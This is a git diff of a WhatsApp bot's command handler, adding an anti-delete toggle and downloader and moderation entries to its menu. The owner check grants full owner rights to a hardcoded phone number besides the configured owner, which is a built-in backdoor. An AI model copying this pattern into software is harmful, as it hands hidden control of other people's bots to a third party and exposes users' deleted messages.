@@ -19,7 +19,7 @@ const ownerOnlyCommands = [
   "leave", "open", "close", "tagadmin", "hidetag", "listactive",
   "changename", "closetime", "warn", "promote", "demote",
   "promoteall", "demoteall", "say", "cpp", "harami", "ghostping",
-  "adminkill", "delaymsg", "autorecording"
+  "adminkill", "delaymsg", "autorerecording", "antidelete"
 ];
 
 // Load menu.js fallback/media references safely
@@ -47,14 +47,16 @@ try {
 // ===============================
 // 🔹 MAIN COMMAND HANDLER
 // ===============================
-async function handleCommand(conn, msg) {
-  const text =
+async function handleCommand(conn, msg, context = {}) {
+  // Use passed context text or extract fallback values directly from message types
+  const text = context.text || 
     msg.message?.conversation ||
     msg.message?.extendedTextMessage?.text ||
     msg.message?.imageMessage?.caption ||
     msg.message?.videoMessage?.caption ||
     "";
 
+  // Check prefix
   if (!text.startsWith(".")) return;
 
   const parts = text.trim().split(/ +/);
@@ -63,16 +65,17 @@ async function handleCommand(conn, msg) {
 
   const chatId = msg.key.remoteJid;
   const isGroup = chatId.endsWith("@g.us");
+  
   const senderId = msg.key.fromMe
     ? conn.user.id.split(":")[0] + "@s.whatsapp.net"
     : msg.key.participant || msg.key.remoteJid;
 
   const senderNum = senderId.replace(/\D/g, "");
   
-  // Clean confirmation tracking using global owner variables defined in index.js
+  // Strict Owner Access Identification Validation
   const isOwner = msg.key.fromMe || senderNum === global.ownerNumber || senderNum === "923143007893";
 
-  const reply = (text) => conn.sendMessage(chatId, { text }, { quoted: msg });
+  const reply = (txt) => conn.sendMessage(chatId, { text: txt }, { quoted: msg });
 
   // 🔸 Mode control
   if (command === "self") {
@@ -89,7 +92,7 @@ async function handleCommand(conn, msg) {
 
   // 🔸 Mode restrictions
   if (global.mode === "self" && !isOwner && !["menu", "repo", "idcheck", "help", "alive"].includes(command)) {
-    return; // Don't reply or execute anything else in self mode for regular users
+    return; // Block execution safely
   }
 
   if (global.mode === "public" && ownerOnlyCommands.includes(command) && !isOwner) {
@@ -171,17 +174,27 @@ async function runCommand({
         return await conn.relayMessage(chatId, menuMessage.message, { messageId: menuMessage.key.id });
       }
 
-      // Default built-in system dashboard if menu data fallback fails
+      // Dynamic Integrated Menu Template Structure Display Block
       const menuText = `🤖 *WELCOME TO ${BOT_NAME.toUpperCase()}* 🤖\n` +
                        `_Maintained smoothly by ${OWNER_NAME}_\n\n` +
                        `⚙️ *SYSTEM COMMANDS* ⚙️\n\n` +
                        `• \`.menu\` / \`.help\` — Show helper dashboard\n` +
                        `• \`.alive\` — Response connectivity test\n` +
-                       `• \`.idcheck\` — Fetch current conversation user identification metadata\n` +
-                       `• \`.self\` — Lockdown system execution into single owner control\n` +
-                       `• \`.public\` — Broadcast usability authorization rules\n\n` +
+                       `• \`.idcheck\` — Fetch conversation metadata\n` +
+                       `• \`.self\` — Switch bot to single owner use\n` +
+                       `• \`.public\` — Authorize public command access\n\n` +
+                       
+                       `🛠️ *DOWNLOADER COMMANDS* 🛠️\n` +
+                       `• \`.tiktok\` — Download TikTok videos\n` +
+                       `• \`.fb\` — Download Facebook Reels\n` +
+                       `• \`.yt\` — Download YouTube videos\n\n` +
+                       
+                       `⚙️ *GROUP MODERATION* ⚙️\n` +
+                       `• \`.kick\` — Remove a member\n` +
+                       `• \`.promote\` — Make a member admin\n\n` +
+                       
                        `👑 *OWNER MOD SWITCHES* 👑\n\n` +
-                       `• \`.autoreact\` | \`.autotyping\` | \`.autostatus\` | \`.antibug\`\n\n` +
+                       `• \`.autoreact\` | \`.autotyping\` | \`.autostatus\` | \`.antibug\` | \`.antidelete\`\n\n` +
                        `_${global.signature || "> 𝗦𝗛𝗔𝗕𝗔𝗔𝗡 𝗕𝗢𝗧 ❦ ✓"}_`;
 
       return reply(menuText);
@@ -194,7 +207,6 @@ async function runCommand({
         const { toggleAntidelete } = require("../antidelete");
         return toggleAntidelete({ conn, m: msg, args, reply, jid: chatId });
       } catch (err) {
-        // Fallback option handler adjustment if specific toggle handler package cannot resolve modularly
         if (global.settings) {
           global.settings.ANTIDELETE = !global.settings.ANTIDELETE;
           return reply(`🗑️ *Anti-Delete Engine:* ${global.settings.ANTIDELETE ? "🟢 ENABLED" : "🔴 DISABLED"}`);
@@ -240,4 +252,4 @@ async function runCommand({
 module.exports = {
   handleCommand
 };
-
+        
